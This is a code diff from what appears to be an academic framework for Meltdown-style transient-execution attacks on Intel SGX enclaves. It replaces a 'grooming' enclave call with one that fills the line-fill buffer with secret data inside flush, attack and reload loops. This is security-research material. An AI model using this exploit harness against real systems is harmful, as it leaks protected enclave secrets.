@@ -82,9 +82,7 @@ int fn_meltdown_st_sgx(char *extra_settings) {
   for (int offset = 0; offset < CACHELINE_SIZE; offset++) {
     app_attack_spec.offset = offset;
     for (int i = 0; i < REPETITION_TIME; i++) {
-      ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
-                     app_clearing_sequence, &app_clearing_buffer,
-                     &app_faulting_buffer);
+      ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
       flush_buffer(&app_encoding_buffer);
       attack(&app_attack_spec, &encalve_secret_buffer, &app_encoding_buffer);
       reload(&app_encoding_buffer, &app_printing_buffer);
@@ -234,9 +232,7 @@ void *victhrd_meltdown_ct_sgx(void *arg) {
   (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
-    ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
-                   app_clearing_sequence, &app_clearing_buffer,
-                   &app_faulting_buffer);
+    ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
   }
 
   return NULL;
@@ -429,9 +425,7 @@ void *victhrd_meltdown_cc_sgx(void *arg) {
   (void)arg;
 
   for (int i = 0; i < REPETITION_TIME * 100; i++) {
-    ecall_grooming(global_eid, app_filling_sequence, &encalve_secret_buffer,
-                   app_clearing_sequence, &app_clearing_buffer,
-                   &app_faulting_buffer);
+    ecall_fill_lfb(global_eid, app_filling_sequence, &encalve_secret_buffer);
   }
 
   return NULL;
